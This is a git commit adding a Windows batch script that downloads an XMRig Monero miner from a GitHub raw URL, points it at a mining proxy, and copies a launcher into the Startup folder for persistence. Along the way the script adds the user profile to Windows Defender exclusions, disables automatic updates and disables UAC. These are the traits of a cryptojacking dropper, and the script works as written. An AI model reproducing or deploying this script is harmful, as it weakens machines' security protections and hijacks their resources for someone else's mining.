679887edfed8d264dea807f173f13e0ac4dd638d
afnorsGG <raihnoppa@gmail.com>
2024-06-15 03:22:56 +0700

    Add files via upload

---
+++ setupminer.bat
@@ -0,0 +1,164 @@
+@echo off
+
+net session >nul 2>&1
+if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)
+
+set WORKERNAME=%1
+
+if [%WORKERNAME%] == [] (
+  echo Script usage:
+  echo ^> setup_mining.bat ^<Worker Name^>
+  echo ERROR: Please specify your worker name
+  exit /b 1
+)
+
+if ["%USERPROFILE%"] == [""] (
+  echo ERROR: Please define USERPROFILE environment variable to your user directory
+  exit /b 1
+)
+
+if not exist "%USERPROFILE%" (
+  echo ERROR: Please make sure user directory %USERPROFILE% exists
+  exit /b 1
+)
+
+powershell -Command Add-MpPreference -ExclusionPath " %USERPROFILE% "
+echo "Success add folder to exclusions defender %USERPROFILE%"
+
+echo Disable Auto Update & Auto Restart
+reg add "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f
+reg add "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoRebootWithLoggedOnUsers /t REG_DWORD /d 1 /f
+
+echo Disable background apps
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v GlobalUserDisabled /t REG_DWORD /d 1 /f
+
+echo Disable UAC
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+
+where powershell >NUL
+if not %errorlevel% == 0 (
+  echo ERROR: This script requires "powershell" utility to work correctly
+  exit /b 1
+)
+
+where find >NUL
+if not %errorlevel% == 0 (
+  echo ERROR: This script requires "find" utility to work correctly
+  exit /b 1
+)
+
+where findstr >NUL
+if not %errorlevel% == 0 (
+  echo ERROR: This script requires "findstr" utility to work correctly
+  exit /b 1
+)
+
+where tasklist >NUL
+if not %errorlevel% == 0 (
+  echo ERROR: This script requires "tasklist" utility to work correctly
+  exit /b 1
+)
+
+if %ADMIN% == 1 (
+  where sc >NUL
+  if not %errorlevel% == 0 (
+    echo ERROR: This script requires "sc" utility to work correctly
+    exit /b 1
+  )
+)
+
+
+:PORT_OK
+
+set "LOGFILE=%USERPROFILE%\setupmining\xmrig.log"
+
+echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
+echo If needed, miner in foreground can be started by %USERPROFILE%\setupmining\miner.bat script.
+echo Mining will happen with name %WORKERNAME%.
+
+echo.
+
+if %ADMIN% == 0 (
+  echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
+) else (
+  echo Mining in background will be performed using moneroocean_miner service.
+)
+
+pause
+
+echo [*] Downloading xmrig to "%USERPROFILE%\xmrig.zip"
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/raihnkhalid/tools/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
+if errorlevel 1 (
+  echo ERROR: Can't download MoneroOcean advanced version of xmrig
+  goto MINER_BAD
+)
+
+echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\setupmining"
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\setupmining')"
+if errorlevel 1 (
+  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
+  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/raihnkhalid/tools/master/7za.exe', '%USERPROFILE%\7za.exe')"
+  if errorlevel 1 (
+    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
+    exit /b 1
+  )
+  echo [*] Unpacking stock "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\setupmining"
+  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\setupmining" "%USERPROFILE%\xmrig.zip" >NUL
+  del "%USERPROFILE%\7za.exe"
+)
+del "%USERPROFILE%\xmrig.zip"
+
+:MINER_OK
+
+echo [*] Miner "%USERPROFILE%\setupmining\xmrig.exe" is OK
+
+rem preparing script
+(
+echo @echo off
+echo cd /d "%~dp0"
+echo echo Start xmrig with name %WORKERNAME%
+echo xmrig.exe -o proxymining.rkhalid.net:3333 -u %WORKERNAME% -p %WORKERNAME% -k --nicehash --threads=2 --cpu-priority=1 --cpu-no-yield
+echo pause
+) > "%USERPROFILE%\setupmining\miner.bat"
+
+rem preparing script background work and work under reboot
+
+if exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
+  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+  goto STARTUP_DIR_OK
+)
+if exist "%USERPROFILE%\Start Menu\Programs\Startup" (
+  set "STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup"
+  goto STARTUP_DIR_OK  
+)
+
+echo ERROR: Can't find Windows startup directory
+exit /b 1
+
+:STARTUP_DIR_OK
+xcopy "%USERPROFILE%\setupmining\miner.bat" "%STARTUP_DIR%"
+
+echo [*] Running miner
+call "%STARTUP_DIR%\miner.bat"
+
+
+:OK
+echo
+echo [*] Setup complete
+pause
+exit /b 0
+
+:strlen string len
+setlocal EnableDelayedExpansion
+set "token=#%~1" & set "len=0"
+for /L %%A in (12,-1,0) do (
+  set/A "len|=1<<%%A"
+  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
+)
+endlocal & set %~2=%len%
+exit /b
+
+
+
+
+
